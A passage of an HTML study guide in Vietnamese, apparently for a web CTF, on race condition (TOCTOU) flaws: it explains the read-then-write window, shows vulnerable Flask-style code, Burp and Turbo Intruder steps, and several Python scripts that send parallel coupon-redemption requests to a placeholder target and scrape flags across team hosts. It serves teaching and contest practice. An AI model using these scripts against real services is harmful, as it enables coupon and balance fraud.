@@ -1,0 +1,545 @@
+<title>Race Condition — Web CTF</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#ecebe4;--fg:#23211c;--muted:#6b665b;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--danger:#c0392b;--burp:#c2561a;--burp-soft:#f6e2d2;
+  --code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:760px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.62;font-size:16px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:40px 24px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,42px);line-height:1.05;margin:.3em 0 .25em;letter-spacing:-.015em}
+.sub{color:var(--muted);font-size:17px;max-width:62ch}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:16px}
+.toc a{font-family:var(--font-mono);font-size:11px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 8px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(20px,4vw,26px);letter-spacing:-.01em;margin:0 0 2px}
+h3{font-family:var(--font-head);font-weight:600;font-size:16.5px;margin:20px 0 6px}
+section.block{padding-block:28px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:10px 0}strong{font-weight:600}a{color:var(--accent)}
+ul,ol{padding-left:21px;margin:9px 0}li{margin:5px 0}
+code{font-family:var(--font-mono);font-size:.86em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:12.5px;line-height:1.56;padding:14px;border-radius:11px;overflow-x:auto;margin:10px 0}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .n{color:#e8c56a}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13.5px}
+th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:var(--muted)}
+tr:last-child td{border-bottom:none}
+.lead{font-size:17.5px}
+.twolayer{display:flex;flex-direction:column;gap:0;border-radius:14px;overflow:hidden;border:1px solid var(--line);margin:16px 0}
+.layer{padding:14px 16px}
+.layer.combat{background:var(--accent-soft);border-bottom:2px dashed var(--accent)}
+.layer.deep{background:var(--mem-soft)}
+.layer .lh{font-family:var(--font-head);font-weight:700;font-size:15px;display:flex;align-items:center;gap:7px;margin-bottom:3px}
+.layer.combat .lh{color:var(--accent)}.layer.deep .lh{color:var(--mem)}
+.layer p{margin:3px 0 0;font-size:14px}
+.note{border-left:3px solid var(--mem);background:var(--surface);padding:11px 14px;border-radius:0 10px 10px 0;margin:14px 0;font-size:14px}
+.note .tag{font-family:var(--font-mono);font-size:10.5px;text-transform:uppercase;letter-spacing:.09em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.note.tip{border-color:var(--ok)}
+.note.warn{border-color:var(--danger)}
+.note.burp{border-color:var(--burp);background:var(--burp-soft)}
+.note.burp .tag{color:var(--burp)}
+.def{border:1px dashed var(--mem);background:var(--mem-soft);border-radius:10px;padding:10px 13px;margin:10px 0;font-size:13.5px}
+.def b{color:var(--mem)}
+.struct{display:flex;flex-direction:column;gap:1px;background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin:12px 0}
+.srow{display:grid;grid-template-columns:30px 1fr;gap:10px;padding:10px 13px;background:var(--surface)}
+.srow .n{font-family:var(--font-mono);font-weight:700;color:var(--accent);font-size:13px}
+.srow .t{font-weight:600;font-size:14px}
+.srow .d{font-size:12.5px;color:var(--muted);margin-top:1px}
+.combatcard{border:2px solid var(--accent);border-radius:12px;overflow:hidden;margin:14px 0}
+.combatcard .ch{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:8px 14px;font-size:14px}
+.combatcard .cb{padding:4px 14px 10px}
+.cslot{padding:10px 0;border-bottom:1px solid var(--line);font-size:13.5px}
+.cslot:last-child{border-bottom:none}
+.cslot .lab{font-family:var(--font-mono);font-size:10.5px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;display:block;margin-bottom:4px}
+.pbreak{border:1px solid var(--line);border-radius:11px;overflow:hidden;margin:12px 0}
+.pbreak .ph{background:var(--surface-2);font-family:var(--font-mono);font-size:12.5px;padding:9px 13px;border-bottom:1px solid var(--line);word-break:break-word}
+.pbreak .pb{padding:10px 13px;font-size:13.5px}
+.pbreak .pb .part{margin:6px 0}
+.pbreak .pb .part code{background:var(--accent-soft);color:var(--accent);font-weight:600}
+.pbreak .resp{background:var(--ok-soft);padding:9px 13px;font-size:13px;border-top:1px dashed var(--line)}
+.pbreak .resp b{color:var(--ok)}
+.svgwrap{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:12px;margin:14px 0}
+.svgwrap svg{width:100%;height:auto;display:block}
+details{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:9px 13px;margin:8px 0;font-size:13.5px}
+summary{cursor:pointer;font-weight:600;color:var(--accent)}
+.badge{display:inline-block;font-family:var(--font-mono);font-size:11px;padding:2px 8px;border-radius:999px;font-weight:700}
+.badge.easy{background:var(--ok-soft);color:var(--ok)}
+.badge.med{background:var(--accent-soft);color:var(--accent)}
+.badge.hard{background:color-mix(in srgb,var(--danger) 16%,transparent);color:var(--danger)}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer;opacity:.9}
+footer{padding-block:22px 40px;color:var(--muted);font-size:13px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">Web CTF · Access Control &amp; Business Logic</div>
+    <h1>Race Condition</h1>
+    <p class="sub">Khi server phải làm 2 bước cho 1 thao tác — "kiểm tra điều kiện" rồi "thực hiện" — luôn có một
+    khoảng thời gian cực ngắn ở giữa. Nếu bạn gửi <strong>nhiều request giống hệt nhau CÙNG LÚC</strong>, nhiều
+    request có thể "lọt" qua bước kiểm tra trước khi bất kỳ request nào kịp cập nhật xong — dùng 1 coupon nhiều
+    lần, rút tiền/điểm nhiều lần hơn mức cho phép.</p>
+    <div class="toc">
+      <a href="#combat">⚡ Combat</a><a href="#s00">00 Tóm tắt</a><a href="#s01">01 Nền tảng</a>
+      <a href="#s02">02 Vì sao</a><a href="#s03">03 Cơ chế</a><a href="#s04">04 Nhận diện</a>
+      <a href="#s05">05 Burp</a><a href="#s06">06 Payload</a><a href="#s07">07 Công cụ</a>
+      <a href="#s08">08 Script</a><a href="#s09">09 Ví dụ</a><a href="#s10">10 WAF</a>
+      <a href="#s11">11 Lỗi gặp</a><a href="#s12">12 Giới hạn</a><a href="#s13">13 Bài tập</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s00">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Race Condition là gì, để làm gì?</h2>
+  <p class="lead">Nhiều thao tác tưởng "một bước" thực ra gồm 2 bước ở server: <strong>đọc</strong> trạng thái
+  hiện tại (vd "số dư còn 100 điểm?"), rồi <strong>ghi</strong> trạng thái mới (vd "trừ 100 điểm, số dư = 0").
+  Nếu 2 request giống hệt nhau tới server <strong>gần như đồng thời</strong>, cả hai có thể cùng đọc thấy "còn
+  100 điểm" (vì request đầu chưa kịp ghi xong), rồi cả hai cùng thực hiện trừ tiền — bạn dùng 1 coupon /
+  rút tiền 2 lần dù đáng lẽ chỉ được phép 1 lần.</p>
+  <div class="note tip"><span class="tag">Nếu chỉ nhớ một điều</span>
+  Mọi chức năng có giới hạn số lần ("chỉ dùng được 1 lần", "không được âm", "chỉ 1 người thắng") đều đáng thử gửi
+  <strong>nhiều request giống hệt nhau thật sát thời điểm nhau</strong> — không phải gửi nhanh liên tiếp (vẫn có
+  độ trễ giữa các lần gửi tuần tự), mà là gửi <strong>song song thật sự</strong> cùng một lúc.</div>
+ </div>
+</section>
+
+<!-- COMBAT CARD -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="secnum">⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay</div>
+  <div class="combatcard">
+    <div class="ch">⚡ RACE CONDITION</div>
+    <div class="cb">
+      <div class="cslot"><span class="lab">🚩 Nhận ra trong 30 giây</span>
+        Chức năng có giới hạn: "dùng coupon 1 lần", "rút tiền không được âm số dư", "mỗi user chỉ đăng ký 1 suất".
+        Gửi request đó 20-50 lần <strong>song song thật sự</strong> (không phải vòng lặp tuần tự) → nếu thực hiện
+        được nhiều hơn 1 lần ⟹ Race Condition xác nhận.
+      </div>
+      <div class="cslot"><span class="lab">✅ Tiền đề cần có</span>
+        Có 1 thao tác giới hạn số lần/số lượng, lặp lại được nhiều lần với cùng request (idempotency key không
+        có, hoặc có nhưng không strict).
+      </div>
+      <div class="cslot"><span class="lab">🔍 Dò nhanh bằng Burp Repeater (tab Group, Send group in parallel)</span>
+        Gửi 1 request vào nhiều tab Repeater trong cùng 1 nhóm (Group), dùng tính năng "Send group in parallel" —
+        Burp tự cố gắng gửi đồng thời.
+      </div>
+      <div class="cslot"><span class="lab">💥 Payload dán-chạy-ngay</span>
+<pre><code><span class="c"># Gửi N bản sao CÙNG request dùng coupon, đồng thời</span>
+POST /redeem-coupon {"code":"SALE50"}   x20, song song</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">🐍 Script khai thác (điền host, chạy)</span>
+<pre><code><span class="k">import</span> re, requests
+<span class="k">from</span> concurrent.futures <span class="k">import</span> ThreadPoolExecutor
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+<span class="k">def</span> <span class="d">redeem</span>(_):
+    <span class="k">return</span> requests.post(<span class="s">"http://TARGET/redeem-coupon"</span>, json={<span class="s">"code"</span>: <span class="s">"SALE50"</span>}).text
+
+<span class="k">with</span> ThreadPoolExecutor(max_workers=20) <span class="k">as</span> ex:
+    results = <span class="k">list</span>(ex.map(redeem, range(20)))
+<span class="k">for</span> r <span class="k">in</span> results:
+    m = FLAG_RE.search(r)
+    <span class="k">if</span> m: <span class="k">print</span>(m.group())</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">⚠️ Gotcha + 🛡️ WAF 1 dòng</span>
+        ThreadPoolExecutor của Python vẫn có độ trễ nhỏ do bắt tay TCP/TLS riêng từng kết nối — nếu không ăn, thử
+        kỹ thuật <strong>single-packet attack</strong> (mục 06) để đồng bộ chuẩn hơn. WAF <strong>không chặn được
+        race condition</strong> bằng payload-matching (giống IDOR) — chỉ có thể rate-limit (xem mục 10). Chưa
+        hiểu? đọc tiếp dưới.
+      </div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s01">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Những thứ cần hiểu trước</h2>
+  <div class="def"><b>TOCTOU (Time-Of-Check to Time-Of-Use)</b> — tên gọi chung cho lớp lỗi này: khoảng thời gian
+  giữa lúc <strong>kiểm tra</strong> điều kiện và lúc <strong>dùng</strong> kết quả kiểm tra đó để hành động, nếu
+  trạng thái có thể đổi trong khoảng đó bởi 1 luồng/request khác, kết quả kiểm tra không còn đúng nữa.</div>
+  <div class="def"><b>Concurrency (đồng thời)</b> — nhiều việc xảy ra "cùng lúc". Với web, nghĩa là nhiều request
+  được server xử lý <strong>chồng lấp thời gian</strong> nhau (không nhất thiết chạy thật sự song song trên nhiều
+  CPU — chỉ cần xen kẽ đủ để 1 request chưa kịp "ghi xong" trước khi request khác "đọc" cùng dữ liệu).</div>
+  <div class="def"><b>Single-packet attack</b> — kỹ thuật dùng HTTP/2 để gửi nhiều request trong <strong>cùng 1
+  gói TCP</strong> (thay vì nhiều kết nối riêng), gần như loại bỏ hoàn toàn độ trễ mạng/jitter giữa các request —
+  khiến chúng tới server thực sự cùng lúc, tăng mạnh tỷ lệ race condition thành công.</div>
+  <p>Code hay viết (thiếu khóa đồng bộ — không atomic):</p>
+  <pre><code><span class="c"># Python/Flask — kiểm tra rồi mới ghi, KHÔNG atomic</span>
+coupon = db.get_coupon(code)
+<span class="k">if</span> <span class="k">not</span> coupon.used:        <span class="c"># BƯỚC ĐỌC</span>
+    apply_discount()
+    coupon.used = <span class="k">True</span>        <span class="c"># BƯỚC GHI -- có khoảng trễ giữa đọc và ghi!</span>
+    db.save(coupon)</code></pre>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s02">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO LỖ HỔNG TỒN TẠI</div>
+  <h2>Kiểm tra và ghi không phải 1 hành động nguyên tử</h2>
+  <p>Trong đầu lập trình viên, "kiểm tra coupon chưa dùng rồi đánh dấu đã dùng" là <strong>một việc</strong>. Nhưng
+  với CPU/database, đó luôn là <strong>ít nhất 2 bước riêng biệt</strong>: đọc giá trị từ database, rồi (sau khi
+  tính toán xong) ghi giá trị mới lại. Giữa 2 bước này có độ trễ (dù chỉ vài mili-giây) — nếu 2 request tới gần
+  như cùng lúc, cả hai có thể <strong>cùng đọc được giá trị "chưa dùng"</strong> trước khi request nào kịp ghi
+  "đã dùng" lại — cả hai đều đi qua điều kiện kiểm tra.</p>
+  <p>Cách vá đúng là biến 2 bước này thành <strong>1 thao tác nguyên tử</strong> (atomic) — database hỗ trợ sẵn
+  (transaction + lock, hoặc update có điều kiện trong 1 câu lệnh) nhưng lập trình viên phải chủ động dùng, không
+  tự nhiên có nếu chỉ viết code "đọc rồi ghi" tuần tự như ví dụ ở mục 01.</p>
+ </div>
+</section>
+
+<!-- 03 -->
+<section class="block" id="s03">
+ <div class="wrap">
+  <div class="secnum">03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI</div>
+  <h2>Dòng thời gian của 2 request chồng lấp nhau</h2>
+  <div class="svgwrap">
+  <svg viewBox="0 0 680 220" xmlns="http://www.w3.org/2000/svg">
+    <style>
+      .lbl{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--fg)}
+      .lbl-m{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--muted)}
+      .lbl-a{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--accent);font-weight:700}
+      .box{fill:var(--surface);stroke:var(--line);stroke-width:1.5}
+      .box-a{fill:var(--accent-soft);stroke:var(--accent);stroke-width:1.5}
+    </style>
+    <text x="10" y="18" class="lbl-m">Trục thời gian (mili-giây) -&gt;</text>
+    <line x1="10" y1="30" x2="670" y2="30" stroke="var(--line)"/>
+
+    <text x="10" y="50" class="lbl-m">Request A:</text>
+    <rect x="90" y="40" width="120" height="25" rx="5" class="box"/>
+    <text x="98" y="57" class="lbl">đọc: used=false</text>
+    <rect x="230" y="40" width="120" height="25" rx="5" class="box-a"/>
+    <text x="238" y="57" class="lbl-a">ghi: used=true</text>
+
+    <text x="10" y="95" class="lbl-m">Request B:</text>
+    <rect x="150" y="85" width="120" height="25" rx="5" class="box"/>
+    <text x="158" y="102" class="lbl">đọc: used=false</text>
+    <rect x="290" y="85" width="120" height="25" rx="5" class="box-a"/>
+    <text x="298" y="102" class="lbl-a">ghi: used=true</text>
+
+    <rect x="150" y="40" width="80" height="70" fill="var(--danger)" opacity="0.12" stroke="var(--danger)" stroke-dasharray="3,3"/>
+    <text x="155" y="130" class="lbl-a" fill="var(--danger)">vùng chồng lấp — cả A và B</text>
+    <text x="155" y="143" class="lbl-a" fill="var(--danger)">đều đọc thấy used=false!</text>
+
+    <text x="10" y="175" class="lbl-m">Kết quả: coupon bị áp dụng GIẢM GIÁ 2 LẦN dù chỉ "dùng được 1 lần"</text>
+  </svg>
+  </div>
+  <p>Nếu A và B không chồng lấp (B gửi SAU KHI A đã ghi xong "used=true"), B sẽ đọc thấy "đã dùng", bị từ chối —
+  đây là hành vi đúng. Toàn bộ kỹ thuật khai thác race condition là <strong>cố ép B gửi tới server trong đúng
+  khung thời gian hẹp mà A chưa kịp ghi xong</strong> — càng gửi nhiều request song song (không phải tuần tự),
+  xác suất có ít nhất 2 request rơi vào khung đó càng cao.</p>
+ </div>
+</section>
+
+<!-- 04 -->
+<section class="block" id="s04">
+ <div class="wrap">
+  <div class="secnum">04 / NHẬN DIỆN KHI GẶP CHALLENGE</div>
+  <h2>Bảng dấu hiệu</h2>
+  <table>
+    <tr><th>Dấu hiệu quan sát được</th><th>Ý nghĩa</th></tr>
+    <tr><td>Chức năng "dùng coupon/mã giảm giá 1 lần"</td><td>Kinh điển cho race condition — redeem nhiều lần</td></tr>
+    <tr><td>Rút tiền/điểm, chuyển khoản có kiểm tra số dư</td><td>Rút vượt số dư bằng cách gửi nhiều request rút cùng lúc</td></tr>
+    <tr><td>"Chỉ 1 người được thắng/nhận giải" (giới hạn số lượng)</td><td>Nhiều user cùng thắng nếu đăng ký đồng thời</td></tr>
+    <tr><td>Đăng ký tài khoản yêu cầu username duy nhất</td><td>2 request đăng ký cùng username cùng lúc có thể cả 2 đều thành công</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 05 -->
+<section class="block" id="s05">
+ <div class="wrap">
+  <div class="secnum">05 / KHAI THÁC BẰNG BURP SUITE</div>
+  <h2>Bấm gì (từng bước)</h2>
+  <div class="note burp"><span class="tag">Burp Repeater — Send group in parallel (bản Burp mới có sẵn)</span>
+  <ol style="margin:4px 0 0">
+    <li>Bắt request thao tác giới hạn (vd redeem coupon), Send to Repeater.</li>
+    <li>Nhân bản tab đó nhiều lần (Ctrl+R hoặc click "+") trong cùng 1 <strong>Group</strong> (gắn nhiều tab vào
+    chung 1 nhóm bằng cách kéo thả hoặc menu chuột phải "Add tab to group").</li>
+    <li>Chuột phải vào group → <strong>"Send group in parallel"</strong> (hoặc "Send group in sequence - single
+    connection" tùy bản Burp) — Burp tự gửi đồng thời qua nhiều kết nối, hoặc dùng kỹ thuật single-packet nếu
+    target hỗ trợ HTTP/2.</li>
+    <li>Xem từng tab Response — đếm số lần request "thành công" (áp dụng coupon) thay vì bị từ chối.</li>
+  </ol></div>
+  <div class="note tip"><span class="tag">Burp Turbo Intruder (extension, cài trước ngày thi)</span>
+  Nếu "Send group in parallel" không đủ chính xác (vẫn có độ trễ), cài extension <strong>Turbo Intruder</strong>
+  từ BApp Store — hỗ trợ kỹ thuật single-packet attack chuẩn hơn hẳn, có sẵn script mẫu <code>race.py</code> trong
+  extension chỉ cần đổi URL/request.</div>
+ </div>
+</section>
+
+<!-- 06 -->
+<section class="block" id="s06">
+ <div class="wrap">
+  <div class="secnum">06 / PAYLOAD & KỸ THUẬT ĐẦY ĐỦ</div>
+  <h2>Các cách tạo request đồng thời, từ dễ tới chuẩn</h2>
+
+  <h3>A. Multi-threading (Python) <span class="badge easy">dễ làm, đủ dùng nhiều trường hợp</span></h3>
+  <p>Dùng <code>ThreadPoolExecutor</code> hoặc <code>asyncio</code> gửi nhiều request cùng lúc. Đơn giản nhất,
+  đủ ăn với nhiều challenge CTF không cần độ chính xác cao.</p>
+
+  <h3>B. Single-packet attack (HTTP/2) <span class="badge hard">chuẩn nhất, cần target hỗ trợ HTTP/2</span></h3>
+  <p>Ý tưởng: gửi gần hết các request trong <strong>1 frame TCP duy nhất</strong>, chỉ thiếu 1 byte cuối của mỗi
+  request, giữ server "treo" chờ — rồi gửi nốt phần thiếu của TẤT CẢ request cùng 1 lúc. Server nhận được toàn
+  bộ request gần như trong cùng 1 khoảnh khắc, loại bỏ hầu hết jitter mạng giữa các kết nối riêng lẻ. Kỹ thuật
+  này triển khai phức tạp bằng tay — nên dùng qua <strong>Turbo Intruder</strong> (mục 07) thay vì tự viết.</p>
+
+  <h3>C. Tăng số lượng request (brute volume)</h3>
+  <p>Nếu không chắc server có window race hẹp hay rộng, tăng số request đồng thời (20 → 50 → 100) — xác suất ít
+  nhất 2 request rơi đúng khung thời gian hẹp tăng theo số lượng gửi.</p>
+ </div>
+</section>
+
+<!-- 07 -->
+<section class="block" id="s07">
+ <div class="wrap">
+  <div class="secnum">07 / CÔNG CỤ THỰC CHIẾN: TURBO INTRUDER</div>
+  <h2>Không chắc Python threading đủ nhanh? Dùng Turbo Intruder</h2>
+  <div class="def"><b>Turbo Intruder</b> — extension Burp chuyên cho race condition và load-testing, viết script
+  Python nhỏ chỉ định request + số lần lặp + độ song song, Burp tự tối ưu gửi theo kỹ thuật single-packet khi
+  target hỗ trợ HTTP/2.</div>
+  <div class="note warn"><span class="tag">Cần cài trước ngày thi</span>Extension từ BApp Store — tải lúc còn
+  Internet. Nếu chưa kịp cài, Python <code>ThreadPoolExecutor</code> (mục 06.A) vẫn ăn được với nhiều challenge,
+  chỉ kém chính xác hơn với window race rất hẹp.</div>
+  <pre><code><span class="c">// Mẫu script Turbo Intruder (dán vào tab Extensions -&gt; Turbo Intruder)</span>
+<span class="k">def</span> <span class="d">queueRequests</span>(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                            concurrentConnections=1,
+                            engine=Engine.BURP2)
+    <span class="c">// Gửi 20 request giống hệt, xếp hàng để bắn gần như đồng thời</span>
+    <span class="k">for</span> i <span class="k">in</span> range(20):
+        engine.queue(target.req, gate=<span class="s">'race1'</span>)
+    engine.openGate(<span class="s">'race1'</span>)   <span class="c">// bắn tất cả cùng lúc</span>
+
+<span class="k">def</span> <span class="d">handleResponse</span>(req, interesting):
+    <span class="k">table</span>.add(req)</code></pre>
+ </div>
+</section>
+
+<!-- 08 -->
+<section class="block" id="s08">
+ <div class="wrap">
+  <div class="secnum">08 / VIẾT SCRIPT KHAI THÁC (3 BẢN)</div>
+  <h2>Từ tay-gõ-Burp sang script tự động</h2>
+
+  <h3>(A) Bản thủ công — để HIỂU từng bước</h3>
+  <pre><code><span class="k">import</span> requests
+<span class="k">from</span> concurrent.futures <span class="k">import</span> ThreadPoolExecutor
+
+url = <span class="s">"http://TARGET/redeem-coupon"</span>
+
+<span class="k">def</span> <span class="d">redeem</span>(i):
+    r = requests.post(url, json={<span class="s">"code"</span>: <span class="s">"SALE50"</span>})
+    <span class="k">return</span> i, r.status_code, r.text[:100]
+
+<span class="k">with</span> ThreadPoolExecutor(max_workers=20) <span class="k">as</span> ex:
+    results = <span class="k">list</span>(ex.map(redeem, range(20)))
+
+<span class="k">for</span> i, status, body <span class="k">in</span> results:
+    <span class="k">print</span>(i, status, body)
+<span class="c"># đếm xem có bao nhiêu lần request THÀNH CÔNG (đáng lẽ chỉ 1 lần được phép)</span></code></pre>
+
+  <h3>(B) Bản gọn chắc — dùng thực chiến, trích thẳng flag</h3>
+  <pre><code><span class="k">import</span> re, requests
+<span class="k">from</span> concurrent.futures <span class="k">import</span> ThreadPoolExecutor
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+
+<span class="k">def</span> <span class="d">exploit_race</span>(host, workers=30):
+    url = <span class="s">f"http://{host}/redeem-coupon"</span>
+    <span class="k">def</span> <span class="d">attempt</span>(_):
+        <span class="k">return</span> requests.post(url, json={<span class="s">"code"</span>: <span class="s">"SALE50"</span>}, timeout=5).text
+    <span class="k">with</span> ThreadPoolExecutor(max_workers=workers) <span class="k">as</span> ex:
+        <span class="k">for</span> text <span class="k">in</span> ex.map(attempt, range(workers)):
+            m = FLAG_RE.search(text)
+            <span class="k">if</span> m:
+                <span class="k">return</span> m.group()
+    <span class="k">return</span> <span class="k">None</span>
+
+<span class="k">print</span>(<span class="s">"FLAG:"</span>, exploit_race(<span class="s">"TARGET_IP"</span>))</code></pre>
+
+  <h3>(C) Bản A/D tái dùng — chạy mọi đội, mọi round</h3>
+  <pre><code><span class="k">import</span> re, requests
+<span class="k">from</span> concurrent.futures <span class="k">import</span> ThreadPoolExecutor
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+
+<span class="k">def</span> <span class="d">exploit_race</span>(host, workers=30):
+    <span class="k">try</span>:
+        url = <span class="s">f"http://{host}/redeem-coupon"</span>
+        <span class="k">def</span> <span class="d">attempt</span>(_):
+            <span class="k">try</span>:
+                <span class="k">return</span> requests.post(url, json={<span class="s">"code"</span>: <span class="s">"SALE50"</span>}, timeout=5).text
+            <span class="k">except</span> requests.RequestException:
+                <span class="k">return</span> <span class="s">""</span>
+        <span class="k">with</span> ThreadPoolExecutor(max_workers=workers) <span class="k">as</span> ex:
+            <span class="k">for</span> text <span class="k">in</span> ex.map(attempt, range(workers)):
+                m = FLAG_RE.search(text)
+                <span class="k">if</span> m:
+                    <span class="k">return</span> m.group()
+    <span class="k">except</span> <span class="k">Exception</span>:
+        <span class="k">pass</span>
+    <span class="k">return</span> <span class="k">None</span>
+
+<span class="k">if</span> __name__ == <span class="s">"__main__"</span>:
+    <span class="k">for</span> host <span class="k">in</span> open(<span class="s">"teams.txt"</span>).read().split():
+        flag = exploit_race(host)
+        <span class="k">if</span> flag:
+            <span class="k">print</span>(<span class="s">f"{host} {flag}"</span>)
+            <span class="k">with</span> open(<span class="s">"flags.txt"</span>, <span class="s">"a"</span>) <span class="k">as</span> f:
+                f.write(<span class="s">f"{flag}\n"</span>)</code></pre>
+  <div class="note tip"><span class="tag">Nếu threading không đủ nhanh</span>Thử tăng <code>max_workers</code>
+  lên 50-100, hoặc thử gửi chính xác cùng 1 thời điểm bằng <code>threading.Barrier</code> (mọi thread tạo request
+  xong, đợi nhau ở vạch xuất phát, rồi cùng gửi 1 lúc) thay vì để <code>ThreadPoolExecutor</code> tự xếp lịch.</div>
+ </div>
+</section>
+
+<!-- 09 -->
+<section class="block" id="s09">
+ <div class="wrap">
+  <div class="secnum">09 / VÍ DỤ THỰC TẾ END-TO-END</div>
+  <h2>Từ nhận service tới lấy flag</h2>
+  <div class="struct">
+    <div class="srow"><span class="n">1</span><div><div class="t">Recon</div><div class="d">Service "Store" (F-Hacker Cửa hàng mô phỏng): mỗi user có 100 điểm, có coupon "SALE50" giảm 50 điểm, dùng 1 lần.</div></div></div>
+    <div class="srow"><span class="n">2</span><div><div class="t">Thử tuần tự (kiểm tra có giới hạn thật)</div><div class="d">Dùng coupon 1 lần: trừ 50 điểm (còn 50). Dùng lần 2 (sau khi lần 1 xong hẳn): bị từ chối "đã dùng" ⟹ có giới hạn thật.</div></div></div>
+    <div class="srow"><span class="n">3</span><div><div class="t">Thử race condition</div><div class="d">Script (A) mục 08, gửi 20 request song song dùng coupon → đếm thấy 15/20 request trả về "thành công", điểm bị trừ còn âm (-650) ⟹ Race Condition xác nhận.</div></div></div>
+    <div class="srow"><span class="n">4</span><div><div class="t">Lấy flag</div><div class="d">Điểm âm vượt ngưỡng kích hoạt 1 tính năng ẩn/thông báo lỗi lộ <code>FHACKER2026{...}</code>, hoặc dùng điểm dư mua được item chứa flag trong Store.</div></div></div>
+    <div class="srow"><span class="n">5</span><div><div class="t">Tự động hóa</div><div class="d">Dùng script (C) mục 08.</div></div></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / PHÒNG THỦ — KHÓ CHẶN BẰNG WAF, GIỐNG IDOR</div>
+  <h2>Vì sao Race Condition cũng khó chặn bằng WAF</h2>
